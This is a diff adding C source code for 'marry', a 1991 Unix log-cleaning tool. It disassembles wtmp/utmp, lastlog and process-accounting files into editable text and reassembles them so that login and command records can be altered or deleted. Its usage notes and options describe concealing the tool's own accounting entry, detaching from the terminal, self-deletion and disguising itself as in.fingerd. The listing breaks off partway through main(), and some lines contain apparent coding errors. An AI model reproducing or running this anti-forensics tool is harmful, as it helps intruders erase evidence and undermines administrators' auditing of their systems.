@@ -1,0 +1,1293 @@
+
+Código fuente del programa marry
+
+/* marry v1.1 (c) 1991 -- Proff -- proff@suburbia.apana.org.au,
+ * All rights reserved.
+ *
+ * May there be peace in the world, and objectivity amoung men.
+ *
+ * You may not use this program for unethical purposes.
+ *
+ * You may not use this program in relation to your employment, or for monetary
+ * gain without express permission from the author.
+ *
+ * usage: 
+ *   marry [-aetsuScDn] [-i src] [-o obj] [-d dump] [-p pat] [-v pat] [-m [WLA]]
+ *         [-E editor] [-h program] [-b backup ]
+ *
+ *   -a   automode, dump, run editor over dump and re-assemble to object
+ *
+ *   -e   edit source, assemble directly to input file, imples no insertion
+ *          of records before an equal quantity of deltion
+ *
+ *   -t   truncate object to last line of dump source when assembling
+ *
+ *   -s   squeeze, delete all record in input not occuring in dump
+ *          (higher entries in input will be appended unless -t is also
+ *          specified)
+ *
+ *   -u   when in [L]astlog mode do user-id -> name lookups (time consuming)
+ *
+ *   -S   Security, when in [A]cct and -[a]uto mode replace editor's acct
+ *          record with an unmodified random previous entry, detach from
+ *          terminal, SIGKILL ourselves or execlp [-h program] to hide our
+ *          acct record (marry should be exec'ed under these circumstances)
+ *
+ *   -c   clean, delete backup and dump files once complete
+ *
+ *   -D   Delete our self once complete (i.e argv[0])
+ *
+ *   -n   no backups, don't make backups when in -e, -a modes or when
+ *          -i file == -o file
+ *
+ *   -i src   input, the utmp, wtmp, lastlog or p/acct file concerned. defaults
+ *              to the system wtmp/lastlog/pacct depending on mode if not specified
+ *
+ *   -o obj   output, the dump assembled and input merged version of the
+ *              above. if given and not in -[a]uto mode, implies we are
+ *              assembling, not dumping.
+ *
+ *   -d dump   dump, the dump (editable representation of src) file name. this
+ *               is is either an input (-o specified) an output (no -o) or both
+ *               -[a]uto. defaults to "marry.dmp" in the current directory if not
+ *               specified
+ *
+ *   -p pat   pattern match. When disassembling (dumping), only extract records
+ *              which match (checked against all string fields, and the uid if
+ *              the pattern is a valid username)
+ *
+ *   -v pat   inverse pattern match. like egrep -v. above non-logic features.
+ *
+ *   -m mode   mode is one of:
+ *                W  -  utmp/wtmp (or utmpx/wtmpx see UTMPX #define)
+ *                L  -  lastlog
+ *                A  -  acct/pacct
+ * 
+ *   -E editor   editor to be used in -[a]uto mode. defaults to /usr/bin/vi. must
+ *                 be the full path in -[S]ecurity mode (we do some clever
+ *                 symlinking)
+ *
+ *   -h program hide, if -S mode is on, then attempt to conceal our acct entry by
+ *              execlp'ing the specified program. this seems to work on BSD derived
+ *              systems. with others, your might want to just call marry something
+ *              innocous.
+ *
+ *   -b backup  name of backup file, defaults to "marry.bak"
+ *
+ *   the following instruction codes can be placed in position one of the dump
+ *   lines to be assembled (e.g "0057a" -> "=057a"):
+ *
+ *   '='   tag modification of entry.
+ *   '+'   tag insertion of entry
+ *
+ * Examples:
+ *
+ * $ marry -mW -i /etc/utmp -s -a       # dump, edit, re-assemble and strip deleted
+ *                                      # entries from utmp
+ * 
+ * $ marry -mL -u -a -n -e              # dump lastlog with usernames, edit, make no
+ *                                      # backups and re-assemble in-situ directly to
+ *                                      # lastlog
+ *
+ * $ marry -mW -a -p mil -E emacs       # dump all wtmp entries matching "mil", edit
+ *                                      # with emacs, re-assemble and re-write to wtmp
+ *
+ * $ exec marry -mA -SceD               # dump all acct entries by root, edit, remove
+ *     -h /usr/sbin/in.fingerd          # editor's acct record, re-assemble directly
+ *     -p root -a -i /var/account/acct  # to acct in-situ, delete backup and dump file,
+ *                                      # delete ourself from the disk, unassign our
+ *                                      # controling terminal, and lastly overlay our
+ *                                      # self (and thus our to be acct record) with
+ *                                      # in.fingerd
+ */
+
+ 
+
+#define UTMP
+#undef UTMPX /* solaris has both */
+#define LASTLOG
+#define PACCT
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <pwd.h>
+#include <grp.h>
+#include <errno.h>
+
+#ifdef __SVR3
+#  include <getopts.h>
+#endif
+#ifndef bsd
+#  if defined(__NetBSD__) || defined(bsdi) || defined(BSDI) || defined(__386BSD__)
+#    define bsd
+#  endif
+#endif
+
+#if !defined(gcc)
+#  define NO_VOID /* non gcc, early compiliers */
+#endif
+
+#ifndef __SVR3
+extern char *optarg;
+#endif
+
+#ifdef NO_VOID
+#  define VOID int
+#  define FVOID
+#else
+#  define VOID void
+#  define FVOID void
+#endif
+
+#ifndef bool
+#  define bool char
+#endif
+
+#define match(a,b) (match_s((a), (b), sizeof(a)))
+
+#ifdef UTMP
+#ifdef UTMPX
+#  include <utmpx.h>
+#  define S_UTMP utmpx
+#  define UT_HOST ut_host
+#  define UT_ID ut_id
+#  define UT_TYPE ut_type
+#  define UT_PID ut_pid
+#  define UT_TV ut_tv
+#  ifdef _PATH_WTMPX
+#    define WTMP_FILE _PATH_WTMPX
+#  else
+#    ifdef WTMPX_FILE
+#      define WTMP_FILE WTMPX_FILE
+#    else
+#      define WTMP_FILE "/usr/adm/wtmpx"
+#    endif
+#  endif
+#else
+#  include <utmp.h>
+#  define S_UTMP utmp
+#  ifndef WTMP_FILE
+#    ifdef _PATH_WTMP
+#      define WTMP_FILE _PATH_WTMP
+#    else
+#      define WTMP_FILE "/usr/adm/wtmp"
+#    endif
+#  endif
+#  if !defined(ut_name) && !defined(ut_user)
+#    define ut_user ut_name
+#  endif
+#  if defined(linux) || defined(bsd) || defined(sun)
+#    define UT_HOST ut_host
+#  endif
+#  ifdef linux
+#    define UT_ADDR ut_addr
+#  endif
+#  define UT_TIME ut_time
+#  if defined(linux) || defined(solaris)
+#    define UT_PID  ut_pid
+#    define UT_ID   ut_id
+#  endif
+#  if defined(linux) || defined(solaris) || defined(sysv) || defined(SYSV) || defined(SVR4)
+#    define UT_TYPE ut_type
+#  endif
+#endif
+#endif
+
+#ifdef LASTLOG
+#  ifdef bsd
+#    ifndef UTMP
+#      include <utmp.h>
+#    endif
+#  else
+#    include <lastlog.h>
+#  endif
+#  ifndef LASTLOG_FILE
+#    ifdef _PATH_LASTLOG
+#      define LASTLOG_FILE _PATH_LASTLOG
+#    else
+#      define LASTLOG_FILE "/usr/adm/lastlog"
+#    endif
+#  endif
+#  define LL_HOST ll_host
+#endif
+
+#ifdef PACCT
+#  include <sys/acct.h>
+#  ifdef bsd
+#    define PACCT_FILE "/var/account/acct"
+#  else
+#    define PACCT_FILE "/usr/adm/pacct"
+#  endif
+#endif
+
+#ifdef UT_ADDR
+#  include <arpa/inet.h>
+#endif
+
+FILE *ofh, *ifh, *afh;
+
+#ifdef UTMP
+struct S_UTMP s_utmp;
+#endif
+
+#ifdef LASTLOG
+struct lastlog s_lastlog;
+#endif
+
+#ifdef PACCT
+struct acct s_acct;
+struct acct ac_saved;
+int acct_step;
+#endif
+
+char ac_comm_hide[32];
+struct passwd *uid;
+struct passwd uid_s;
+char **uida=NULL;
+char **gida=NULL;
+
+#define MAX_UID 65537
+
+char *quotes="\"\"";
+int globline=0; 
+char *a_Input=NULL;
+char *a_Output=NULL;
+char *a_Pattern=NULL;
+char *a_Hide=NULL;
+
+#ifdef sun
+char *a_Editor="/usr/ucb/vi";
+#else
+char *a_Editor="/usr/bin/vi";
+#endif
+
+char *a_Dump="marry.dmp";
+char *a_Backup="marry.bak";
+bool f_Auto=0;
+bool f_Squeeze=0;
+bool f_EditSrc=0;
+bool f_Truncate=0;
+bool f_Exclude=0;
+bool f_Uid=0;
+bool f_Security=0;
+bool f_Clean=0;
+bool f_DeleteSelf=0;
+bool f_NoBackups=0;
+bool f_backedup;
+char mode;
+int mode_size=0;
+void *mode_data;
+int globline;
+char *mes;
+time_t otime=0;
+
+FVOID display()
+{
+static int n;
+time_t t;
+  globline++;
+  if (n++<30) return; /* don't want too many context switches */
+  n=0;
+  time(&t);
+  if (t<(otime+1)) return;
+  otime=t;
+  printf("%s%d\r", mes, globline);
+  fflush(stdout);
+}
+
+FVOID display_end()
+{
+  printf("%s%d\n", mes, globline);
+  fflush(stdout);
+}
+
+#ifdef NO_VOID
+char
+#else
+void
+#endif
+* Smalloc(n)
+int n;
+{
+#ifdef NO_VOID
+char
+#else
+void
+#endif
+* p;
+  while (!(p=malloc(n))) sleep(1);
+  return p;
+}
+
+bool copyf(src, dst)
+char *src;
+char *dst;
+{
+#define CBUFLEN 128*1024
+int fi, fo;
+char *buf;
+int cc;
+
+  if ((fi=open(src, O_RDONLY, 0))<0)
+   {
+     perror(src);
+     exit(1);
+   }
+  if ((fo=open(dst, O_WRONLY|O_CREAT|O_TRUNC, 0666))<0)
+   {
+    perror(dst);
+    exit(1);
+   }
+  buf=Smalloc(CBUFLEN);
+  while ((cc=read(fi, buf, CBUFLEN))>0)
+  if (write(fo, buf, cc)!=cc)
+   {
+    perror(dst);
+    exit(1);
+   }
+  close(fo);
+  close(fi);
+  free(buf);
+  return 1;
+}
+
+ 
+
+bool backup(src)
+char *src;
+{
+  printf("backup = %s\n", a_Backup);
+  fflush(stdout);
+  return copyf(src, a_Backup);
+}
+
+ 
+
+char *match_s(haystack, needle, n)
+char *haystack;
+char *needle;
+int n;
+{
+static char tmp[256];
+
+  strncpy(tmp, haystack, n>sizeof(tmp)? sizeof(tmp): n);
+  return strstr(tmp, needle);
+}
+
+ 
+
+unsigned short atoi2(s)
+char *s;
+{
+            return (s[0]-'0')*10+(s[1]-'0');
+}
+
+ 
+
+char *p_string(s, size)
+char *s;
+int size;
+{
+static char sss[1024];
+register int n;
+char *ss=sss;
+  if (!*s) return quotes;
+    for (n=0; n<size; n++)
+     {
+      char c=s[n];
+      switch (c)
+       {
+        case '\\':
+          *(ss++)=c;
+          break;
+        case ' ':
+          *(ss++)='\\';
+          break;
+        case '\t':
+          *(ss++)='\\';
+          c='t';
+          break;
+        case '\n':
+          *(ss++)='\\';
+          c='n';
+          break;
+        case '\r':
+          *(ss++)='\\';
+          c='r';
+          break;
+        case 0:
+          goto end;
+       }
+      *(ss++)=c;
+     }
+end:
+     *ss=0;
+     return sss;
+}
+
+ 
+
+char *skip_white(s)
+char *s;
+{
+  for (; *s && (*s=='\t' || *s==' '); s++);
+  if (!*s || (*s=='\n')) return NULL;
+  return s;
+}
+
+ 
+
+char *g_string(d, s, size)
+char *d;
+char *s;
+int size;
+{
+int y;
+char c;
+char f_esc=0;
+  for (y=0; y<size; y++) d[y]=0;
+  if (!(s=skip_white(s))) return NULL;
+  if (*s=='"' && *(s+1)=='"') return s+2;
+  for (y=0; y<size; s++)
+   {
+    c=*s;
+    if (f_esc)
+     {
+      switch(c)
+       {
+        case 'r':
+          c='\r';
+          break;
+        case 'n':
+          c='\n';
+          break;
+        case 't':
+          c='\t';
+          break;
+       }
+      f_esc=0;
+     }
+    else
+     {
+      switch(c)
+       {
+        case '\\':
+          f_esc=1;
+          continue;
+        case ' ':
+        case '\t':
+        case '\n':
+        case '\0':
+          goto end;
+       }
+      }
+    d[y++]=c;
+   }
+end:
+   return s+1;
+}
+
+ 
+
+char *time_s(tt)
+time_t tt;
+{
+static char s[13];
+  time_t t=tt; /* some compilers won't take a parameter address */
+  struct tm *tp;
+  tp=localtime(&t);
+  sprintf(s, "%02d%02d%02d%02d%02d%02d",
+    tp->tm_year, tp->tm_mon+1, tp->tm_mday,
+       tp->tm_hour, tp->tm_min, tp->tm_sec);
+  return s;
+}
+
+ 
+
+time_t time_i(s)
+char *s;
+{
+struct tm lt;
+time_t t;
+  if (strlen(s)!=12) return (time_t)-1;
+  time(&t);
+  lt=*localtime(&t);
+  lt.tm_year=atoi2(s);
+  lt.tm_mon=atoi2(s+2)-1;
+  lt.tm_mday=atoi2(s+4);
+  lt.tm_hour=atoi2(s+6);
+  lt.tm_min=atoi2(s+8);
+  lt.tm_sec=atoi2(s+10);
+  lt.tm_isdst=-1;
+  return mktime(&lt);
+}
+
+ 
+
+char * bgetgrgid(u)
+gid_t u;
+{
+struct group *gr;
+  if (!gida)
+   {
+    int n;
+    gida=(char **)Smalloc(sizeof(char *)*MAX_UID);
+    for (n=0; n<MAX_UID; n++) gida[n]=NULL;
+   }
+  if (gida[u]==(char *)-1) return NULL;
+  if (gida[u]) return gida[u];
+  if (!(gr=getgrgid(u)))
+   {
+    gida[u]=(char *)-1;
+    return NULL;
+   }
+  gida[u]=Smalloc(strlen(gr->gr_name)+1);
+  strcpy(gida[u], gr->gr_name);
+  return gida[u];
+}
+
+ 
+
+char * bgetpwuid(u)
+uid_t u;
+{
+struct passwd *pw;
+  if (!uida)
+   {
+    int n;
+    uida=(char **)Smalloc(sizeof(struct passwd *)*MAX_UID);
+    for (n=0; n<MAX_UID; n++) uida[n]=NULL;
+   }
+  if (uida[u]==(char *)-1) return NULL;
+  if (uida[u]) return uida[u];
+  if (!(pw=getpwuid(u)))
+   {
+    uida[u]=(char *)-1;
+    return NULL;
+   }
+  uida[u]=Smalloc(strlen(pw->pw_name)+1);
+  strcpy(uida[u], pw->pw_name);
+  return uida[u];
+}
+
+#ifdef UTMP
+bool dump_utmp(uline, ut)
+int uline;
+struct S_UTMP *ut;
+{
+time_t tim;
+  if (a_Pattern)
+   {
+    if (!match(ut->ut_user, a_Pattern) &&
+      !match(ut->ut_line, a_Pattern)
+#ifdef UT_HOST
+      && !match(ut->UT_HOST, a_Pattern)
+#endif
+      ) { if (!f_Exclude) return 1;}
+             else if (f_Exclude) return 1;
+        }
+        fprintf(afh, "%05x", uline-1);
+        fprintf(afh, " %-8s", p_string(ut->ut_user, sizeof(ut->ut_user)));
+        fprintf(afh, " %-11s", p_string(ut->ut_line, sizeof(ut->ut_line)));
+#ifdef UT_ID
+        fprintf(afh, " %-4s", p_string(ut->UT_ID, sizeof(ut->UT_ID)));
+#endif
+#ifdef UT_TYPE
+        fprintf(afh, " %-2x", ut->UT_TYPE);
+#endif
+#ifdef UT_PID
+        fprintf(afh, " %-5d", (int)ut->UT_PID);
+#endif
+#if defined(UT_TIME) || defined (UT_TV)
+#  ifdef UT_TIME
+        tim=ut->UT_TIME;
+#  else
+        tim=ut->UT_TV.tv_sec;
+#  endif
+        fprintf(afh, " %s", time_s(tim));
+#endif
+#ifdef UT_ADDR
+        fprintf(afh, " %-15s", inet_ntoa(*((struct in_addr *)&ut->UT_ADDR)));
+#endif
+#ifdef UT_HOST
+        fprintf(afh, " %s", p_string(ut->UT_HOST, sizeof(ut->UT_HOST)));
+#endif
+        fputc('\n', afh);
+        return 1;
+}
+#endif
+
+#ifdef LASTLOG
+bool dump_lastlog(uline, ll)
+int uline;
+struct lastlog *ll;
+{
+  char *name;
+  struct passwd *pw;
+  if (f_Uid)
+   {
+    pw=getpwuid(uline-1);
+    name=pw? pw->pw_name: quotes;
+   } else
+   {
+     static char s[6];
+     sprintf(s, "%05d", uline-1);
+     name=s;
+   }
+  if (a_Pattern)
+   {
+    if (
+      (!uid || (uid->pw_uid!=(uline-1))) &&
+        (!f_Uid || strstr(name, a_Pattern)) &&
+#ifdef LL_HOST
+         !match(ll->ll_host, a_Pattern) &&
+#endif
+         !match(ll->ll_line, a_Pattern)
+         ) {
+      if (!f_Exclude) return 1;
+           }
+        else if (f_Exclude) return 1;
+    }
+  fprintf(afh, "%05x", uline-1);
+  printf(afh, " %-8s", name);
+  fprintf(afh, " %-11s", p_string(ll->ll_line, sizeof(ll->ll_line)));
+  fprintf(afh, " %s", time_s(ll->ll_time));
+#ifdef LL_HOST
+  fprintf(afh, " %s", p_string(ll->LL_HOST, sizeof(ll->LL_HOST)));
+#endif
+  fputc('\n', afh);
+  return 1;
+}
+#endif
+ 
+#ifdef PACCT
+bool dump_pacct(uline, ac)
+int uline;
+struct acct *ac;
+{
+  char *name;
+  char *gr_name;
+
+  if (!(name=bgetpwuid(ac->ac_uid)))
+   {
+    static char s[6];
+    sprintf(s, "%05d", ac->ac_uid);
+    name=s;
+   }
+  if (!(gr_name=bgetgrgid(ac->ac_gid)))
+   {
+    static char s[6];
+    sprintf(s, "%05d", ac->ac_gid);
+    gr_name=s;
+   }
+  if (a_Pattern)
+   {
+    if ((!uid || (uid->pw_uid!=ac->ac_uid)) &&
+        (strstr(name, a_Pattern)) &&
+          (strstr(gr_name, a_Pattern)))
+     {
+       if (!f_Exclude) return 1;
+     }
+    else if (f_Exclude) return 1;
+   }
+  fprintf(afh, "%05x", uline-1);
+  fprintf(afh, " %-8s", name);
+  fprintf(afh, " %-8s", gr_name);
+  fprintf(afh, " %-10s", p_string(ac->ac_comm, sizeof(ac->ac_comm)));
+  if (ac->ac_tty==(dev_t)-1) fputs(" ----", afh);
+   else
+     fprintf(afh, " %04x", ac->ac_tty);
+  fprintf(afh, " %2x", ac->ac_flag);
+  fprintf(afh, " %s", time_s(ac->ac_btime));
+  fputc('\n', afh);
+  return 1;
+}
+#endif
+ 
+FVOID makedump()
+{
+int uline;
+  if ((ifh=fopen(a_Input, "r"))==NULL)
+   {
+    perror(a_Input);
+    exit(1);
+   }
+  if ((afh=fopen(a_Dump, "w"))==NULL)
+   {
+    perror(a_Dump);
+    exit(1);
+   }
+  fputc('\n', stdout);
+  globline=0;
+  mes="entries disassembled: ";
+  for (uline=1; fread(mode_data, mode_size, 1, ifh)>0; uline++)
+   {
+    display();
+    switch(mode)
+     {
+#ifdef UTMP
+      case 'W':
+        dump_utmp(uline, mode_data);
+        break;
+#endif
+#ifdef LASTLOG
+      case 'L':
+        dump_lastlog(uline, mode_data);
+        break;
+#endif
+#ifdef PACCT
+      case 'A':
+        dump_pacct(uline, mode_data);
+        break;
+#endif
+      }
+    }
+  display_end();
+  fclose(afh);
+  fclose(ifh);
+}
+ 
+int seek_ifh(uline)
+int uline;
+{
+  if (ftell(ifh)!=mode_size*(uline-1))
+    if (fseek(ifh, mode_size*(uline-1), SEEK_SET)==-1)
+      return 0;
+  return 1;
+}
+ 
+#ifdef UTMP
+int mod_utmp(ut, p)
+struct S_UTMP *ut;
+char *p;
+{
+  char *op;
+  static char tmp[255];
+#if defined(UT_TIME) || defined(UT_TV)
+#endif
+  op=p;
+  if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+  if (!(p=g_string(ut->ut_user, p, sizeof(ut->ut_user)))) return 0;
+  if (!(p=g_string(ut->ut_line, p, sizeof(ut->ut_line)))) return 0;
+
+#ifdef UT_ID
+   if (!(p=g_string(ut->UT_ID, p, sizeof(ut->UT_ID)))) return 0;
+#endif
+
+#ifdef UT_TYPE
+  if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+  sscanf(tmp, "%x", (unsigned int *)&(ut->UT_TYPE));
+#endif
+
+#ifdef UT_PID
+  if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+  ut->UT_PID=atoi(tmp);
+#endif
+#if defined(UT_TIME) || defined(UT_TV)
+  if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+
+#ifdef UT_TIME
+  if ((ut->UT_TIME=time_i(tmp))==(time_t)-1)
+#else /* UT_TV */
+  if ((ut->UT_TV.tv_sec=time_i(tmp))==(time_t)-1)
+#endif
+  fprintf(stderr, "warning: invalid time spec %s", op);
+#endif
+
+#ifdef UT_ADDR
+  if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+    ut->UT_ADDR=inet_addr(tmp);
+#endif
+
+#ifdef UT_HOST
+  if (!(p=g_string(ut->UT_HOST, p, sizeof(ut->UT_HOST)))) return 0;
+#endif
+  return 1;
+}
+#endif
+
+#ifdef LASTLOG
+int mod_lastlog(ll, p)
+struct lastlog *ll;
+char *p;
+{
+  char *op;
+  static char tmp[255];
+  op=p;
+  if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+  if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0; /*skip name*/
+  if (!(p=g_string(ll->ll_line, p, sizeof(ll->ll_line)))) return 0;
+  if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+  if ((ll->ll_time=time_i(tmp))==(time_t)-1)
+    fprintf(stderr, "warning illegal time: %s\n", op);
+
+#ifdef LL_HOST
+  if (!(p=g_string(ll->ll_host, p, sizeof(ll->ll_host)))) return 0;
+#endif
+  return 1;
+}
+#endif
+
+
+#ifdef PACCT
+int mod_pacct(ac, p)
+struct acct *ac;
+char *p;
+{
+  static char tmp[255];
+  struct passwd *pw;
+  struct group *gr;
+  char *op;
+  long int t;
+  unsigned int tu;
+  op=p;
+
+  if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+  if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+  if (sscanf(tmp, "%ld", &t)!=1)
+  {
+    if (!(pw=getpwnam(tmp)))
+      fprintf(stderr, "warning: unknown username %s\n", op);
+    else
+      ac->ac_uid=pw->pw_uid;
+  }
+  else ac->ac_uid=t;
+
+  if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+  if (sscanf(tmp, "%ld", &t)!=1)
+  {
+    if (!(gr=getgrnam(tmp)))
+      fprintf(stderr, "warning: unknown group %s\n", op);
+    else
+      ac->ac_gid=pw->pw_gid;
+  }
+  else ac->ac_gid=t;
+
+  if (!(p=g_string(ac->ac_comm, p, sizeof(ac->ac_comm)))) return 0;
+  if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+  if (sscanf(tmp, "%x", &tu)!=1) ac->ac_tty=(dev_t)-1;
+  else ac->ac_tty=tu;
+  if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+  if (sscanf(tmp, "%x", &tu)!=1)
+    fprintf(stderr, "warning: invalid flags %s\n", op);
+  else ac->ac_flag=tu;
+  if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+  if ((ac->ac_btime=time_i(tmp))==(time_t)-1)
+    fprintf(stderr, "warning: illegal time: %s\n", op);
+  return 1;
+}
+#endif
+
+
+bool wcopy(uline)
+int uline;
+{
+  if (!seek_ifh(uline)) return 0;
+  while (fread(mode_data, mode_size, 1, ifh)>0)
+  {
+    display();
+#ifdef PACCT
+    if (f_Security && f_Auto && mode=='A')
+    {
+      struct acct *p;
+      p=(struct acct *)mode_data;
+      if (!strncmp(p->ac_comm, ac_comm_hide, sizeof(ac_comm_hide)))
+      {
+        ac_saved.ac_btime=p->ac_btime;
+        *p=ac_saved;
+      }
+    }
+#endif
+    if (fwrite(mode_data, mode_size, 1, ofh)<1) return 0;
+  }
+#ifndef NO_FTRUNCATE
+  if (f_Squeeze && f_EditSrc) ftruncate(fileno(ofh), ftell(ofh));
+#endif
+  return 1;
+}
+ 
+bool domod(p)
+char *p;
+{
+  bool ret=0;
+  if (fread(mode_data, mode_size, 1, ifh)<1) return 0;
+  switch(mode)
+  {
+#ifdef UTMP
+    case 'W':
+      ret=mod_utmp(mode_data, p);
+      break;
+#endif
+#ifdef LASTLOG
+    case 'L':
+      ret=mod_lastlog(mode_data, p);
+      break;
+#endif
+#ifdef PACCT
+    case 'A':
+      ret=mod_pacct(mode_data, p);
+      break;
+#endif
+  }
+
+  if (!ret)
+    fprintf(stderr, "warning: invalid dump input `%s'\n", p);
+  return 1;
+}
+ 
+static wu_line=0;
+int obj_update(uline, p, f_mod)
+int uline;
+char *p;
+char f_mod;
+{
+  if (f_Squeeze)
+  {
+    display();
+    seek_ifh(uline);
+    if (f_mod) {if (!domod(p)) return 0;}
+      else if (fread(mode_data, mode_size, 1, ifh)<1) return 0;
+    if (fwrite(mode_data, mode_size, 1, ofh)<1) return 0;
+  } else {
+    if (f_EditSrc)
+    {
+      if (f_mod)
+        fseek(ofh, mode_size*(uline-1), SEEK_SET);
+      } else {
+         while(++wu_line<uline)
+         {
+           display();
+           if (fread(mode_data, mode_size, 1, ifh)<1) return 0;
+           if (fwrite(mode_data, mode_size, 1, ofh)<1) return 0;
+         }
+        }
+      if (f_mod)
+      {
+        seek_ifh(uline);
+        if (!domod(p)) return 0;
+        if (f_mod==2) wu_line--;
+      } else if (fread(mode_data, mode_size, 1, ifh)<1) return 0;
+      if (fwrite(mode_data, mode_size, 1, ofh)<1) return 0;
+      display();
+  }
+#ifdef PACCT
+  if (f_Security && f_Auto && !f_mod && mode=='A')
+  if (!uline%acct_step) ac_saved=*(struct acct *)mode_data;
+#endif
+  return 1;
+}
+ 
+FVOID makeobject()
+{
+int uline=1;
+char line[1024];
+char *p;
+char f_mod;
+  if ((ifh=fopen(a_Input, "r"))==NULL)
+  {
+    perror(a_Input);
+    exit(1);
+  }
+  if ((afh=fopen(a_Dump, "r"))==NULL)
+  {
+    perror(a_Dump);
+    exit(1);
+  }
+  if ((ofh=fopen(a_Output, f_EditSrc? "r+": "w"))==NULL)
+  {
+    perror(a_Output);
+    exit(1);
+  }
+
+#ifdef PACCT
+  if (f_Security && f_Auto && mode=='A')
+    acct_step=(getpid()+8)%60;
+#endif
+
+  fputc('\n', stdout);
+  globline=0;
+  mes="entries assembled: ";
+  while (1)
+  {
+    if (!fgets((p=line), sizeof(line), afh))
+    {
+      if (f_EditSrc)
+      {
+#ifndef NO_FTRUNCATE
+        if (f_Truncate)
+        {
+          fflush(ofh);
+          ftruncate(fileno(ofh), uline*mode_size);
+        }
+#endif
+        goto closeup;
+      }
+    if (!f_Truncate) wcopy(uline+1);
+    goto closeup;
+    }
+    switch (*p)
+    {
+      case 0:
+      case '#':
+      case '\n':
+        continue;
+      case '=':
+        f_mod=1;
+        p++;
+        break;
+      case '+':
+        if (f_EditSrc)
+        {
+          if (f_Squeeze)
+            fprintf(stderr, "warning: the + operator can have \
+              unpredictable effects when used in conbination with -e and -s\n");
+          else
+          {
+            fprintf(stderr, "error: + operator used with -e\n");
+            exit(1);
+          }
+        }
+        f_mod=2;
+        p++;
+        break;
+      default: {f_mod=0; break;}
+    }
+    if (sscanf(p, "%x", &uline)!=1)
+    {
+      perror("invalid line number in ascii input");
+      exit(1);
+    }
+    uline++;
+    if (!obj_update(uline, p, f_mod))
+    {
+      perror("read/write failed");
+      exit(1);
+    }
+  }
+closeup:
+  display_end();
+  fclose(ofh);
+  fclose(ifh);
+  fclose(afh);
+}
+ 
+FVOID usage(s)
+char *s;
+{
+  fprintf(stderr, "usage: %s\t[-aetsuScDn] [-i src] [-o obj] [-d dump] [-p pat] [-v pat] [-m [WLA]]\n\
+     \t\t[-E editor] [-h program]\n", s);
+  exit(1);
+}
+ 
+int main(argc, argv)
+int argc;
+char **argv;
+{
+  char *ed;
+  char c;
+#ifdef PACCT
+  mode='A';
+#endif
+#ifdef LASTLOG
+  mode='L';
+#endif
+#ifdef UTMP
+  mode='W';
+#endif
+
+  puts("marry v1.0 (c) 1991 -- Proff -- All rights reserved.");
+  umask(022);
+  while ((c=getopt(argc, argv, "i:o:d:aetsp:v:m:uScDnE:h:b:"))!=-1)
+  switch(c)
+  {
+    case 'i':
+      a_Input=optarg;
+      break;
+    case 'o':
+      a_Output=optarg;
+      break;
+    case 'd':
+      a_Dump=optarg;
+      break;
+    case 'a':
+      f_Auto=1;
+      break;
+    case 'e':
+      f_EditSrc=1;
+      break;
+    case 't':
+      f_Truncate=1;
+      break;
+    case 's':
+      f_Squeeze=1;
+      break;
+    case 'p':
+      a_Pattern=optarg;
+      break;
+    case 'v':
+      f_Exclude=1;
+      a_Pattern=optarg;
+      break;
+    case 'm':
+      mode=*optarg;
+      break;
+    case 'u':
+      f_Uid=1;
+      break;
+    case 'S':
+      f_Security=1;
+      break;
+    case 'c':
+      f_Clean=1;
+      break;
+    case 'D':
+      f_DeleteSelf=1;
+      break;
+    case 'n':
+      f_NoBackups=1;
+      break;
+    case 'E':
+      a_Editor=optarg;
+      break;
+    case 'h':
+      a_Hide=optarg;
+      break;
+    case 'b':
+      a_Backup=optarg;
+      break;
+    case '?':
+    default:
+      fprintf(stderr, "%s: unknown option `%c'\n", argv[0], c);
+      usage(argv[0]);
+      /* NOT_REACHED */
+  }
+  if (a_Output && f_EditSrc)
+  {
+    perror("can't have -o and -e together");
+    exit(1);
+  }
+  switch(mode)
+  {
+#ifdef UTMP
+    case 'W':
+      mode_size=sizeof(struct S_UTMP);
+      mode_data=&s_utmp;
+      if (!a_Input) a_Input=WTMP_FILE;
+      break;
+#endif
+#ifdef LASTLOG
+    case 'L':
+      mode_size=sizeof(struct lastlog);
+      mode_data=&s_lastlog;
+      if (!a_Input) a_Input=LASTLOG_FILE;
+      break;
+#endif
+#ifdef PACCT
+    case 'A':
+      mode_size=sizeof(struct acct);
+      mode_data=&s_acct;
+      if (!a_Input) a_Input=PACCT_FILE;
+      break;
+#endif
+    default:
+      fprintf(stderr, "unknown mode `%c'\n", mode);
+      usage();
+      /*NOT_REACHED*/
+    }
+    if (a_Pattern) uid=getpwnam(a_Pattern);
+    if (uid) {uid_s=*uid; uid=&uid_s;}
+    if (f_Auto)
+    {
+      struct stat st1, st2;
+      int pid;
+      int ws;
+      if (stat(a_Editor, &st1))
+      {
+        fprintf(stderr, "error: editor `%s' must exist with -a (check -E value)\n", a_Editor);
+        exit(1);
+      }
+      makedump();
+      if (f_Security)
+      {
+        sprintf(ac_comm_hide, "m%d", getpid());
+        symlink(a_Editor, ac_comm_hide);
+        ed=ac_comm_hide;
+      } else  ed=a_Editor;
+      stat(a_Dump, &st1);
+      if (!(pid=fork()))
+      {
+        printf("%s %s\n", ed, a_Dump);
+        fflush(stdout);
+        execlp(ed, ed, a_Dump, 0);
+        perror(ed);
+        _exit(1);
+      }
+      if (pid<0)
+      {
+        perror("fork");
+        exit(1);
+      }
+      while (wait(&ws)!=pid);
+      if (f_Security)
+        unlink(ac_comm_hide);
+      stat(a_Dump, &st2);
+      if (st1.st_mtime==st2.st_mtime)
+      {
+        fprintf(stderr, "`%s' not modified -- aborted\n", a_Dump);
+        exit(1);
+      }
+      if (!a_Output || !strcmp(a_Input, a_Output))
+      {
+        backup(a_Input);
